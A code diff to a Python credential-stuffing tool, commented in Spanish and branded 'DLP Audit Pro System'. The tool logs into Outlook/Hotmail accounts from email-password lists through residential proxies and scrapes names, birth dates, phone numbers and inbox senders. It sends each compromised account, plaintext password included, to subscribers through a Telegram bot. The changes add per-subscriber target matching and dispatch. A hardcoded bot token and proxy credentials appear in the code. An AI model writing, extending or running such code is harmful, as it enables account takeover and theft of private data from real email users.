@@ -65,18 +65,23 @@ import imaplib
 import email as email_lib
 
 def get_target_senders_from_db():
-    """Carga los remitentes objetivo guardados en la BD del dashboard"""
+    """Carga los remitentes objetivo por usuario desde la tabla users en BD Render"""
+    user_targets = {}
     try:
         conn = get_remote_db_conn()
-        if not conn: return []
+        if not conn: return {}
         cur = conn.cursor()
-        # Busca la tabla de senders objetivo si existe
-        cur.execute("SELECT email FROM target_senders LIMIT 50")
+        cur.execute("SELECT telegram_chat_id, saved_senders FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
         rows = cur.fetchall()
         conn.close()
-        return [r[0].strip().lower() for r in rows]
+        for cid, senders_raw in rows:
+            if senders_raw:
+                senders = [s.strip().lower() for s in senders_raw.split(',') if s.strip()]
+                if senders:
+                    user_targets[cid] = senders
+        return user_targets
     except:
-        return []
+        return {}
 
 def search_inbox_owa(session, email_addr, target_senders):
     """
@@ -297,11 +302,14 @@ class DummyQueue:
     def put(self, item):
         pass # Silenciamos el log detallado por credencial en este nivel para no trabar la consola CMD
 
-def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target_senders=None):
-    """
-    Motor 2 Migrado: Flujo Desktop OAuth + Substrate API
-    Obtiene el Token Bearer real y extrae Profile + Inbox.
-    """
+def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user_targets_dict={}):
+    """Realiza la verificación completa y extrae V1Profile + Substrate Inbox DL usando peticiones HTTP directas"""
+    
+    # Flatten unique targets for optimized single-pass search
+    target_senders = list(set(s for senders in user_targets_dict.values() for s in senders))
+    if not target_senders: target_senders = []
+    
+    print(f"\n[VPS Scraper] 🟢 Procesando {email} ...")
     session = requests.Session()
     
     from requests.adapters import HTTPAdapter
@@ -666,56 +674,68 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
             elif email_lower.endswith('.pt'): country = 'PT'
             else: country = 'US'
 
-        formatted_senders = ", ".join([f"{addr} ({cnt})" for addr, cnt in senders_found.items()]) if senders_found else "N/A"
-        
-        hit_data = {
+        # --- DISPATCH HIT POR USUARIO ---
+        hit_global_data = {
             "email": email,
             "pass": password,
             "domain": "outlook.com",
             "match": keyword if keyword else "HOTMAIL HQ",
             "messages": subject_count,
-            "senders": formatted_senders,
             "country": country,
             "name": name,
             "dob": dob,
             "language": language,
-            "phone": phone,
-            "chat_id": "" 
+            "phone": phone
         }
-
-        # --- Enviar Alerta Individual Inmediata Vía Telegram ---
+        
         token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
-        target_chat_id = os.environ.get("TELEGRAM_CHAT_ID", "1016773223") # Fallback to default user if env fails
-        
-        # Determine actual target chat if DB has it
-        target_cid = target_chat_id
-        if 'active_cid' in globals() and active_cid: target_cid = active_cid
-            
-        realtime_alert = (
-            f"📣 ¡OBJETIVO DETECTADO! (HIT) 🎯\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"👤 Usuario: VPS Agent\n"
-            f"✅ Match: {hit_data['match']}\n"
-            f"📧 Correo: {email}\n"
-            f"🔑 Pass: {password}\n"
-            f"🌍 País: {country}\n\n"
-            f"👤 Nombre: {name}\n"
-            f"📅 DOB: {dob}\n"
-            f"🗣️ Idioma: {language}\n"
-            f"📱 Teléf: {phone}\n\n"
-            f"📊 Mensajes: {subject_count}\n"
-            f"🔍 Búsqueda: from:{', from:'.join(target_senders) if target_senders else 'N/A'}\n"
-            f"🤖 DLP Audit Pro System"
-        )
-        
-        try:
-            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
-                          json={"chat_id": target_cid, "text": realtime_alert})
-        except: pass
 
-        if getattr(hits_buffer, 'append', None) is not None:
-            hits_buffer.append(hit_data)
+        if not user_targets_dict:
+            # Fallback for old mode or single user testing
+            fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "1016773223")
+            formatted_senders = ", ".join([f"{a} ({c})" for a, c in senders_found.items()]) if senders_found else "N/A"
+            hit_data = hit_global_data.copy()
+            hit_data["senders"] = formatted_senders
+            hit_data["chat_id"] = fallback_cid
+            if getattr(hits_buffer, 'append', None) is not None: hits_buffer.append(hit_data)
+        else:
+            # Multi-Tenant Dispatch Protocol
+            for cid, u_senders in user_targets_dict.items():
+                u_found = {a: c for a, c in senders_found.items() if a in u_senders}
+                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos
+                if not u_found and len(u_senders) > 0:
+                    continue # El usuario no encontraría nada de lo suyo aquí
+                
+                formatted_u_senders = ", ".join([f"{a} ({c})" for a, c in u_found.items()]) if u_found else "N/A"
+                hit_data = hit_global_data.copy()
+                hit_data["senders"] = formatted_u_senders
+                hit_data["chat_id"] = str(cid)
+                
+                realtime_alert = (
+                    f"📣 ¡OBJETIVO DETECTADO! (HIT) 🎯\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 Usuario: VPS Agent\n"
+                    f"✅ Match: {hit_data['match']}\n"
+                    f"📧 Correo: {email}\n"
+                    f"🔑 Pass: {password}\n"
+                    f"🌍 País: {country}\n\n"
+                    f"👤 Nombre: {name}\n"
+                    f"📅 DOB: {dob}\n"
+                    f"🗣️ Idioma: {language}\n"
+                    f"📱 Teléf: {phone}\n\n"
+                    f"📊 Mensajes Relevantes: {sum(u_found.values()) if u_found else 0}\n"
+                    f"🔍 Búsqueda: from:{', from:'.join(u_senders) if u_senders else 'N/A'}\n"
+                    f"🤖 DLP Audit Pro System"
+                )
+                
+                try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": str(cid), "text": realtime_alert})
+                except: pass
+                
+                if getattr(hits_buffer, 'append', None) is not None:
+                    hits_buffer.append(hit_data)
+
     except Exception as e:
+        print(f"[DEBUG vps_agent] Local audit general error: {e}")
         pass
 
 def process_file_and_scan(file_path, keyword=""):
@@ -790,7 +810,7 @@ def process_file_and_scan(file_path, keyword=""):
             "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
             "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
         }
-        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword, target_senders_list)
+        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword, user_targets_dict=target_senders_list)
         time.sleep(random.uniform(0.5, 1.2))
 
     # 🔥 TURBO MODE: 10 hilos en paralelo ejecutados localmente
@@ -808,7 +828,7 @@ def process_file_and_scan(file_path, keyword=""):
             conn = get_remote_db_conn()
             if conn:
                 cur = conn.cursor()
-                cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
+                cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
                 active_users = cur.fetchall()
                 conn.close()
             
@@ -824,12 +844,8 @@ def process_file_and_scan(file_path, keyword=""):
                 if is_admin == 1: 
                     super_admins.append(cid)
                     
-                for original_hit in hits_buffer:
-                    user_hit_copy = original_hit.copy()
-                    user_hit_copy["chat_id"] = cid
-                    final_hits_to_dispatch.append(user_hit_copy)
-                    
-            send_consolidated_report(final_hits_to_dispatch)
+            # Los HITS ya vienen con el chat_id mapeado desde run_local_audit! Send_consolidated ya sabe qué mandarle a quién.
+            send_consolidated_report(hits_buffer)
             
             if super_admins:
                 print("🧠 Generando Reporte de Salud (Llama-3) para Súper Administrador...")
